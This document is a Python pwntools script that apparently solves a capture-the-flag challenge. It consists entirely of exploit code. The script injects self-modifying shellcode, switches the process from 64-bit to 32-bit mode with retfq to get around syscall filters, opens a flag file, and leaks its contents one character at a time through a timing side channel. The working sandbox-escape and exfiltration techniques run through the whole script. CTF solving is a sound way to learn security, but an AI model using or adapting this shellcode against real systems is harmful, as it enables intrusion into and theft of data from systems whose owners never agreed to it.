from pwn import *
import time
# context.log_level = 'debug'

append_x86 = '''
push ebx
pop ebx
'''
append = '''
push rdx
pop rdx
'''

shellcode_x86 = '''
/*fp = open("flag")*/
mov esp, 0x40404140

/* s = "flag" */
push 0x67616c66

/* ebx = &s */
push esp
pop ebx

/* ecx = 0 */
xor ecx, ecx

mov eax,5
int 0x80

mov ecx, eax
'''
shellcode_x86 = asm(shellcode_x86, arch = 'i386')

shellcode_mmap = '''
/*mmap(0x40404040, 0x7e, 7, 34, 0, 0)*/
push 0x40404040 /*set rdi*/
pop rdi

push 0x7e /*set rsi*/
pop rsi

push 0x40 /*set rdx*/
pop rax
xor al,0x47
push rax
pop rdx

push 0x40 /*set r8*/
pop rax
xor al,0x40
push rax
pop r8

push rax /*set r9*/
pop r9

/*syscall*/
push rbx
pop rax
push 0x5d
pop rcx
xor byte ptr[rax+0x31], cl
push 0x5f
pop rcx
xor byte ptr[rax+0x32], cl

push 0x22 /*set rcx*/
pop rcx

push 0x40/*set rax*/
pop rax
xor al,0x49
'''

shellcode_read = '''
/*read(0, 0x40404040, 0x70)*/

push 0x40404040 /*set rsi*/
pop rsi

push 0x40 /*set rdi*/
pop rax
xor al,0x40
push rax
pop rdi

xor al,0x40 /*set rdx*/
push 0x70
pop rdx

/*syscall*/
push rbx
pop rax
push 0x5d
pop rcx
xor byte ptr[rax+0x57],cl
push 0x5f
pop rcx
xor byte ptr[rax+0x58],cl

push rdx /*set rax*/
pop rax
xor al,0x70
'''

shellcode_retfq = '''
/*mode_64 -> mode_32*/
push rbx
pop rax

xor al,0x40

push 0x72
pop rcx
xor byte ptr[rax+0x40],cl
push 0x68
pop rcx
xor byte ptr[rax+0x40],cl
push 0x47
pop rcx
sub byte ptr[rax+0x41],cl
push 0x48
pop rcx
sub byte ptr[rax+0x41],cl
push rdi
push rdi
push 0x23
push 0x40404040
pop rax
push rax
'''

def pwn(p, index, ch):
    shellcode = ''

    # mmap
    shellcode += shellcode_mmap
    shellcode += append

    # read shellcode
    shellcode += shellcode_read
    shellcode += append

    # mode_64 -> mode_32
    shellcode += shellcode_retfq
    shellcode += append

    shellcode = asm(shellcode, arch = 'amd64', os = 'linux')

    p.sendline(shellcode)
    time.sleep(0.05)

    shellcode_flag ="""
    push 0x33
    push 0x40404089
    retfq
    
    /*read(fp,buf,0x70)*/
    mov rdi,rcx
    mov rsi,rsp
    mov rdx,0x70
    xor rax,rax
    syscall

    loop:
    cmp byte ptr[rsi+{0}], {1}
    jz loop
    ret
    """.format(index, ch)
    shellcode_flag = asm(shellcode_flag, arch = 'amd64', os = 'linux')

    p.sendline(shellcode_x86 + 0x29*b'\x90' + shellcode_flag)

flag = ""
index = 0
last = 'a'
while True:
    update = False
    for ch in range(32, 127):
        sh = process("./pwn")
        pwn(sh, index, ch)
        start = time.time()
        try:
            sh.recv(timeout = 2)
        except:
            pass
        end = time.time()
        sh.close()
        if end - start > 1.5:
            flag += chr(ch)
            last = chr(ch)
            update = True
            print(flag)
            break
    
    assert(update == True)
    
    if last == '}':
        break
    
    index += 1

print(flag)
